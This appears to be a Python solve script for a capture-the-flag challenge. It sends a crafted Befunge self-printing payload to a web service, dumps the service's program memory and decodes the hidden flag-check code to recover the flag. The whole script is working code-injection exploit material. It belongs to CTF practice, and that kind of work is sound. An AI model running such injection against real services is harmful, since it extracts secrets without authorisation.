#!/usr/bin/env python3

import sys
import requests

# raw injection code
quine = """
"0002",,,,91+,99*1-00p010p020p>10g20gg,10g1+:00g%1vxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx|<-*55p02:+g02/g00p0<xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
"""

quine_lines = quine.split("\n")[1:]

# the actual payload, starting after the first " and accounting
# for the line reverses and extra ><v^ commands which are inserted
payload = (
    quine_lines[0][1:-1]
    + quine_lines[1][1:-1][::-1]
    + quine_lines[2][1 : quine_lines[2].index("@") + 1]
)


def interpret(code) -> int:
    stack = []
    pop = lambda: stack.pop() if len(stack) > 0 else 0
    push = lambda a: stack.append(a)

    for c in code:
        if c in "0123456789":
            push(int(c))
            continue

        if c == ":":
            a = pop()
            push(a)
            push(a)
            continue

        b, a = pop(), pop()
        if c == "+":
            push(a + b)
        elif c == "-":
            push(a - b)
        elif c == "*":
            push(a * b)
        elif c == "/":
            push(a // b)
        else:
            raise ValueError(f"unsupported cmd {c}")

    return pop()


def main():
    if len(sys.argv) < 2:
        print("Specify task URL as first argument", file=sys.stderr)
        sys.exit(1)

    taskURL = sys.argv[1]

    r = requests.post(taskURL, data={"guess": payload})

    needle = b"result: "
    start = r.content.index(needle)
    end = r.content.index(b"</span", start)

    playfield = r.content[start + len(needle) : end]
    playfield = (
        playfield.replace(b"&quot;", b'"').replace(b"&lt;", b"<").replace(b"&gt;", b">")
    )

    # order code in one single direction
    code = b""
    for i, line in enumerate(
        [playfield[i : i + 80] for i in range(0, len(playfield), 80)]
    ):
        if i % 2 == 1:
            line = line[::-1]
        code += line

    # extract the original flagcmp code after our "end" command
    flagcmp_code = code[code.index(b"@") + 1 :]
    flagcmp_code = flagcmp_code[: flagcmp_code.index(b"@")]

    # skip prefix which sets up the cmp variable
    flagcmp_code = flagcmp_code[len('"10:p') :].decode()

    # remove direction changes since we've flattened the code
    for cmd in ["<", ">", "^", "v"]:
        flagcmp_code = flagcmp_code.replace(cmd, "")

    # split into separate checks, "-!0:g*0:p" simply compares the next stack element to the expected flag char
    flag_comparisons = flagcmp_code.split("-!0:g*0:p")

    # the last part prints the result
    flag_comparisons = flag_comparisons[:-1]

    flag = "".join(map(lambda cmp: chr(interpret(cmp)), flag_comparisons[::-1]))
    print(flag)


if __name__ == "__main__":
    main()
